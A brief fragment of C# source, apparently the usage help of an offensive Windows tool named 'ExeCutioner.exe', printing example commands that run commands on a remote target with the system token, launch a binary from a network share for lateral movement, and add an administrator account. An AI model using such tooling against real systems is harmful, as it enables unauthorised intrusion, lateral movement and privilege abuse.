...
";
            ...
            Console.WriteLine("ExeCutioner.exe /t <target name or IP> /syscreds /cmd <command-to-run-in-qoutes>\n");

            Console.WriteLine("//Authenticate to target with current system token and execute binary for lateral movement");
            Console.WriteLine("ExeCutioner.exe /t <target name or IP> /syscreds /cmd <\\192.168.10.8\\lateralmovement.exe>\n");
            ...
            Console.WriteLine("ExeCutioner.exe /t <target name or IP> /syscreds /addadmin true");
